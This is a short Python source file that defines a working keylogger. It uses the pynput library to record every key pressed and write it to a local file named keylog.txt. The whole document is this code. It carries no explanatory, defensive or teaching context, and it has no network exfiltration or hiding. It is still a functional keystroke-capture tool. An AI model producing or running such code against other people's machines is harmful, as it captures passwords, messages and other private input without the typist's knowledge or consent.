import pynput

def keylogger():
    with open("keylog.txt", "w") as file:
        def on_press(key):
            try:
                file.write(f"{key.char}")
            except AttributeError:
                file.write(f"{key}")

        with pynput.keyboard.Listener(on_press=on_press) as listener:
            listener.join()

if __name__ == "__main__":
    keylogger()
